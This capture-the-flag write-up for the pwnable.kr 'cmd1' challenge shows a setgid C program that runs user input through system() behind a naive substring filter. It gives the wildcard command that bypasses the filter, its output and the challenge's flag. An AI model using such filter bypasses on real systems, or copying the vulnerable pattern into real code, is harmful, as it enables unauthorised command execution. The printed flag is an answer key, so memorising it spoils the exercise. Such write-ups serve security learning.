# URL
https://pwnable.kr/play.php

# SSH Credentials
ssh cmd1@pwnable.kr -p2222 (pw:guest)

# Source Code
  ```
    #include <stdio.h>
    #include <string.h>
    
    int filter(char* cmd){
    	int r=0;
    	r += strstr(cmd, "flag")!=0;
    	r += strstr(cmd, "sh")!=0;
    	r += strstr(cmd, "tmp")!=0;
    	return r;
    }
    int main(int argc, char* argv[], char** envp){
    	putenv("PATH=/thankyouverymuch");
    	if(filter(argv[1])) return 0;
    	setregid(getegid(), getegid());
    	system( argv[1] );
    	return 0;
    }
  ```

# Concept
The program attempts to restrict command execution by filtering specific substrings and modifying the PATH environment variable. However, due to improper sanitization and reliance on naive substring matching, the filter can be bypassed using shell wildcard expansion.

# Method of Solve
- Login using the ssh credentials
- Perform ls -la to list all the files and cat the cmd1.c to inspect the source code
- As we can see in the source code ... Some filters are applied if they are caught in the arguments of the program, the execution will be bocked
  ```
    #include <stdio.h>
    #include <string.h>
    
    int filter(char* cmd){
    	int r=0;
    	r += strstr(cmd, "flag")!=0;
    	r += strstr(cmd, "sh")!=0;
    	r += strstr(cmd, "tmp")!=0;
    	return r;
    }
  ```
- Hence direct naming such as cat flag, or /bin/cat flag, or /bin/sh will block the execution
- So we will use the wildcard execution using * to complete the filename
  ```
    cmd1@ubuntu:~$ ./cmd1 "/bin/cat f*"
    PATH_environment?_Now_I_really_g3t_it,_mommy!
  ```
- The /bin/cat f* opens the flag file after completion so we get the flag
- The Flag is **PATH_environment?_Now_I_really_g3t_it,_mommy!**
